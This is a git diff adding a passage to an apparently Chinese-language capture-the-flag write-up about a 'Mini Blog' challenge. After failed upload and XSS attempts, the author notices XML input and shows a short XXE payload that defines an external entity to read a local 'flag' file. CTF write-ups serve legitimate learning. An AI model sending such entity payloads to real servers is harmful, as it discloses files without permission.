@@ -382,7 +382,21 @@ Go
 <img width="1375" height="480" alt="image" src="https://github.com/user-attachments/assets/26943a3e-20e8-4a40-9c3e-9c2d620fbb5e" />
 后面再改个位置就行，不再截了。
 
-
+Mini Blog
+这里原来看到个个人资料有个图片上传，试了一下感觉是白名单想搞个二次渲染发现不行，再试了一下XSS也不行，然后抓个包：
+<img width="873" height="312" alt="image" src="https://github.com/user-attachments/assets/9eee3ac9-4495-43ce-aee5-331cd5d68b63" />
+看起来是XXE，构造一下就行(XXE是啥，常用方法让我后面好好学一下....)
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file://flag">
+]>
+<post>
+<title>&xxe;</title>
+<content>1</content>
+</post>
+```
+<img width="1883" height="289" alt="image" src="https://github.com/user-attachments/assets/0676c97d-7f82-4232-abfb-28dbc58c953f" />
 
 
 
